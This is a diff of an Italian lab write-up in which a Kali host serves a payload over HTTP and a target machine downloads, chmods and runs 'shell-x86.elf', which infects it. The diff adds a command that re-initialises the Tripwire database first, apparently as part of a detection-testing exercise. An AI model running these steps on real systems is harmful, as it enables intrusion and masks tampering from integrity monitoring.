@@ -272,9 +272,10 @@ cd Desktop/payloads
 sudo python -m http.server 80
 ```
 ---
-Per far si che la macchina `target` subisca l'attacco è necessario scaricare l'eseguibile esposto dalla macchina `Kali` attraverso il web server. Dunque, collegandosi all'indirizzo `192.128.1.23` tramite un qualsiasi browser è possibile scaricare il file ed eseguirlo tramite i seguenti comandi: 
+Per far si che la macchina `target` subisca l'attacco è necessario scaricare l'eseguibile esposto dalla macchina `Kali` attraverso il web server. Dunque, collegandosi all'indirizzo `192.128.1.23` tramite un qualsiasi browser scaricare il file, inizializzare nuovamente il database di `Tripwire` ed eseguire il file; tutto questo attraverso i seguenti comandi: 
 ```bash
 sudo chmod +x ./shell-x86.elf ##Concediamo diritti per esecuzione
+sudo tripwire --init 
 ./shell-x86.elf ##Esecuzione
 ```
 Fatto ciò la macchina sarà infetta. Una volta che la macchina `Kali` avrà cambiato i permessi della cartella `./Target` sarà possibile iniziare la procedura di verifica:
